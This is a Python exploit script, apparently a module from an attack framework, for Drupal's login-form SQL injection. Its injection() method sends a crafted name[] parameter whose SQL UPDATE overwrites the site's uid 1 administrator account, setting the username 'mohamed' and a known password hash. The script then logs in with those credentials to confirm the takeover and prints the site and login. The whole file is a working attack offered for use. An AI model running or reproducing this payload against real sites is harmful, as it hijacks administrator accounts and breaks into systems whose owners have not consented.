import urllib2
import urllib
import requests
from colorama import *
import re

COMMENT = "Drupal SQL injection (add admin)"
ARGS    = {
  'URL'  : '',
  'user' : 'mohamed'
}
AUTHOR = 'Mohamed Aziz (MatriX Coder)'

class Drupal(object) :

  def __init__(self, site) :
    self.site    = site
    self.req     = requests.Session()
    
  def injection(self) :
    try :
      #header = {
       # "Content-Type: application/x-www-form-urlencoded","User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"}
      handler = urllib2.HTTPHandler()
      opener = urllib2.build_opener(handler)
      postdata = "name[0;update users set name %3D 'mohamed' , pass %3D '"+urllib.quote_plus('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu')+"',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in"
      #print postdata
      req = urllib2.Request(self.site+'user/login', data=postdata)
      connection = opener.open(req)
      if 'mb_strlen() expects parameter 1 to be string' in connection.read() or 'FcUk Crap' in connection.read() :
        return True
      else : return False
    except :
      pass
      return False 

    #s = self.request.post(self.site+'user/login', data=postdata)
    #print s.text
    
  def makeReq(self, user, password) :
    postdata = {
      'name' : user,
      'pass' : password,
      'form_build_id' : 'form-pl5wVd5PUbwtt9aazUjzRLvugRfXYvT211SdYbTWdOc',
      'form_id'       : 'user_login',
      'op' : 'Log+in'
    }
    #print self.site
    try :
      self.req.post(self.site+'user/login', data=postdata)
    except  Exception as e:
      print e
      pass

  def checkLogedin(self) :
    try :
      html = self.req.get(self.site+'/user/login')
      a = True
      #print html
      if re.findall('edit-name', html.text) :
        a = False
      return a
    except Exception as e : 
      return False
      print e
      pass

def bambam() :
  init()
  site = ARGS['URL']
  print "[*] Trying to exploit " + site
  dru = Drupal(site)
  a = dru.injection()
  if a :
    print "Site may be exploited !"
    # Checking
    dru.makeReq('mohamed', 'admin')
    if dru.checkLogedin() : print Back.GREEN+"Exploited : " +site+':mohamed:admin'+Back.RESET
    else : print Back.RED+"Not vulnerable !"+Back.RESET
  deinit()